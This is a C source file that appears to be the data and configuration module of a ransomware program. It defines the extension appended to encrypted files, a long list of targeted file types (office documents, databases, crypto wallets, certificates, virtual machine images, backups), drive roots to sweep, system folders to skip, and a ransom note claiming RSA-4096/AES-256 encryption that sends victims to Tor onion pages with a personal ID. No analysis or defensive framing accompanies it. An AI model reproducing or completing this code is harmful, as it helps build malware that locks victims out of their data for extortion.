#include <stdio.h>
const char *cr_data_key_fname="key";

const ssize_t cr_data_min_password_size=18;
const ssize_t cr_data_max_password_size=32;
const size_t cr_data_max_file_enc_size=40*1024*1024; // 40mb
const char *cr_data_ext="ytrpc";
const char *cr_data_exts[]={".yuv",".ycbcra",".xis",".wpd",".tex",".sxg",".stx",".srw",".srf",".sqlitedb",".sqlite3",".sqlite",".sdf",".sda",".s3db",".rwz",".rwl",".rdb",".rat",".raf",".qby",".qbx",".qbw",".qbr",".qba",".psafe3",".plc",".plus_muhd",".pdd",".oth",".orf",".odm",".odf",".nyf",".nxl",".nwb",".nrw",".nop",".nef",".ndd",".myd",".mrw",".moneywell",".mny",".mmw",".mfw",".mef",".mdc",".lua",".kpdx",".kdc",".kdbx",".jpe",".incpas",".iiq",".ibz",".ibank",".hbk",".gry",".grey",".gray",".fhd",".ffd",".exf",".erf",".erbsql",".eml",".dxg",".drf",".dng",".dgc",".des",".der",".ddrw",".ddoc",".dcs",".db_journal",".csl",".csh",".crw",".craw",".cib",".cdrw",".cdr6",".cdr5",".cdr4",".cdr3",".bpw",".bgt",".bdb",".bay",".bank",".backupdb",".backup",".back",".awg",".apj",".ait",".agdl",".ads",".adb",".acr",".ach",".accdt",".accdr",".accde",".vmxf",".vmsd",".vhdx",".vhd",".vbox",".stm",".rvt",".qcow",".qed",".pif",".pdb",".pab",".ost",".ogg",".nvram",".ndf",".m2ts",".log",".hpp",".hdd",".groups",".flvv",".edb",".dit",".dat",".cmt",".bin",".aiff",".xlk",".wad",".tlg",".say",".sas7bdat",".qbm",".qbb",".ptx",".pfx",".pef",".pat",".oil",".odc",".nsh",".nsg",".nsf",".nsd",".mos",".indd",".iif",".fpx",".fff",".fdb",".dtd",".design",".ddd",".dcr",".dac",".cdx",".cdf",".blend",".bkp",".adp",".act",".xlr",".xlam",".xla",".wps",".tga",".pspimage",".pct",".pcd",".fxg",".flac",".eps",".dxb",".drw",".dot",".cpi",".cls",".cdr",".arw",".aac",".thm",".srt",".save",".safe",".pwm",".pages",".obj",".mlb",".mbx",".lit",".laccdb",".kwm",".idx",".html",".flf",".dxf",".dwg",".dds",".csv",".css",".config",".cfg",".cer",".asx",".aspx",".aoi",".accdb",".7zip",".xls",".wab",".rtf",".prf",".ppt",".oab",".msg",".mapimail",".jnt",".doc",".dbx",".contact",".mid",".wma",".flv",".mkv",".mov",".avi",".asf",".mpeg",".vob",".mpg",".wmv",".fla",".swf",".wav",".qcow2",".vdi",".vmdk",".vmx",".wallet",".wallet.dat",".upk",".sav",".ltx",".litesql",".litemod",".lbf",".iwi",".forge",".das",".d3dbsp",".bsa",".bik",".asset",".apk",".gpg",".aes",".ARC",".PAQ",".tar.bz2",".tbk",".bak",".tar",".tgz",".rar",".zip",".djv",".djvu",".svg",".bmp",".png",".gif",".raw",".cgm",".jpeg",".jpg",".tif",".tiff",".NEF",".psd",".cmd",".sh",".bat",".class",".jar",".java",".asp",".brd",".sch",".dch",".dip",".vbs",".asm",".pas",".cs",".py",".cpp",".pl",".php",".ldf",".mdf",".ibd",".MYI",".MYD",".frm",".odb",".dbf",".mdb",".sql",".SQLITEDB",".SQLITE3",".pst",".onetoc2",".asc",".lay6",".lay",".ms11 (Security copy)",".sldm",".sldx",".ppsm",".ppsx",".ppam",".docb",".mml",".sxm",".otg",".odg",".uop",".potx",".potm",".pptx",".pptm",".std",".sxd",".pot",".pps",".sti",".sxi",".otp",".odp",".wks",".xltx",".xltm",".xlsx",".xlsm",".xlsb",".slk",".xlw",".xlt",".xlm",".xlc",".dif",".stc",".sxc",".ots",".ods",".hwp",".dotm",".dotx",".docm",".docx",".max",".xml",".txt",".uot",".RTF",".pdf",".XLS",".PPT",".stw",".sxw",".ott",".odt",".DOC",".pem",".csr",".crt",".key"};

const char *cr_data_dirnames[]={"/","c:/","d:/","f:/","g:/","b:/","z:/","e:/","h:/","i:/","j:/","k:/","l:/","m:/","n:/","o:/","p:/","r:/","s:/","t:/","u:/","v:/","w:/","y:/"};

const char *cr_data_skip_dirnames[]={"tmp","winnt","Application Data","AppData","Program Files(x86)","Program Files","temp","thumbs.db","$Recycle.Bin","System Volume Information","Boot","Windows"};

char *cr_data_msg=
	">>-|-+__+-|->><pre>"
	""
	"!!! IMPORTANT INFORMATION !!!"
	""
	"All of your files are encrypted with RSA-4096 and AES-256 ciphers."
	"More information about the RSA and AES can be found here:"
	"        http://en.wikipedia.org/wiki/RSA_(cryptosystem)"
	"        http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"
	""
	"Decrypting of your files is only possible with the private key and decrypt program,"
	"which is on our secret server."
	"To receive your private key follow one of the links:"
	"        {{onion1tor2web}}"
	"        {{onion2tor2web}}"
	""
	"If all of this addresses are not available, follow these steps:"
	"        1. Download and install Tor Browser:"
	"           https://www.torproject.org/download/download-easy.html"
	""
	"        2. After a successful installation, run the browser and wait for initialization."
	"        3. Type in the address bar: "
	"           {{onion}}"
	""
	"        4. Follow the instruction on the site."
	""
	""
	"!!! Your personal indentification ID: {{ind_id}} !!!"
	""
	"</pre><<-|-+__+-|-<<"
	""

	;





























